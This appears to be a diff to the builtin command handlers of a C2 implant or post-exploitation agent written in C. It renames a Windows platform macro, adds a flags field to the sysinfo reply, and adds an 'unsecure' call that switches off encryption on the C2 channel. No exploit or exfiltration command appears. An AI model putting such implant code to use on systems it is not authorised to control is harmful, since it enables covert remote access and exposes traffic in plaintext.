@@ -34,7 +34,7 @@
 
 #include <mbedtls/pk.h>
 
-#ifndef IS_WINDOWS
+#ifndef __windows__
 #include <pwd.h>
 #endif
 
@@ -85,6 +85,10 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        BUILTIN_BASE, \
                        API_CALL + 8)
+#define BUILTIN_UNSECURE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       BUILTIN_BASE, \
+                       API_CALL + 9)
 
 #define TLV_TYPE_PLATFORM  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE)
 #define TLV_TYPE_VERSION   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 1)
@@ -94,6 +98,7 @@
 
 #define TLV_TYPE_RAM_USED  TLV_TYPE_CUSTOM(TLV_TYPE_INT, BUILTIN_BASE, API_TYPE)
 #define TLV_TYPE_RAM_TOTAL TLV_TYPE_CUSTOM(TLV_TYPE_INT, BUILTIN_BASE, API_TYPE + 1)
+#define TLV_TYPE_FLAGS     TLV_TYPE_CUSTOM(TLV_TYPE_INT, BUILTIN_BASE, API_TYPE + 2)
 
 #define TLV_TYPE_PUBLIC_KEY  TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, BUILTIN_BASE, API_TYPE)
 #define TLV_TYPE_KEY         TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, BUILTIN_BASE, API_TYPE + 1)
@@ -178,7 +183,7 @@ static tlv_pkt_t *builtin_time(c2_t *c2)
     struct tm local_time;
     time_t time_ctx;
 
-#ifndef IS_WINDOWS
+#ifndef __windows__
     memset(date_time, '\0', 128);
     time_ctx = time(NULL);
 
@@ -228,6 +233,7 @@ static tlv_pkt_t *builtin_sysinfo(c2_t *c2)
 
     tlv_pkt_add_u64(result, TLV_TYPE_RAM_TOTAL, memory.total);
     tlv_pkt_add_u64(result, TLV_TYPE_RAM_USED, memory.used);
+    tlv_pkt_add_u32(result, TLV_TYPE_FLAGS, core->flags);
 
     return result;
 }
@@ -236,7 +242,7 @@ static tlv_pkt_t *builtin_whoami(c2_t *c2)
 {
     tlv_pkt_t *result;
 
-#ifndef IS_WINDOWS
+#ifndef __windows__
     struct passwd *pw_entry;
 
     if ((pw_entry = getpwuid(geteuid())))
@@ -283,6 +289,30 @@ static void builtin_enable_security(struct eio_req *request)
     crypt_set_secure(c2->crypt, STAT_SECURE);
 
     free(c2->crypt->next_key);
+}
+
+static void builtin_disable_security(struct eio_req *request)
+{
+    c2_t *c2;
+
+    c2 = request->data;
+    c2_enqueue_tlv(c2, c2->response);
+
+    tlv_pkt_destroy(c2->request);
+    tlv_pkt_destroy(c2->response);
+
+    crypt_set_secure(c2->crypt, STAT_NOT_SECURE);
+    crypt_set_algo(c2->crypt, ALGO_NONE);
+}
+
+static tlv_pkt_t *builtin_unsecure(c2_t *c2)
+{
+    c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+
+    log_debug("* Disabling security\n");
+    eio_custom(builtin_disable_security, 0, NULL, c2);
+
+    return NULL;
 }
 
 static tlv_pkt_t *builtin_secure(c2_t *c2)
@@ -345,6 +375,7 @@ void register_builtin_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, BUILTIN_WHOAMI, builtin_whoami);
     api_call_register(api_calls, BUILTIN_UUID, builtin_uuid);
     api_call_register(api_calls, BUILTIN_SECURE, builtin_secure);
+    api_call_register(api_calls, BUILTIN_UNSECURE, builtin_unsecure);
 }
 
 #endif
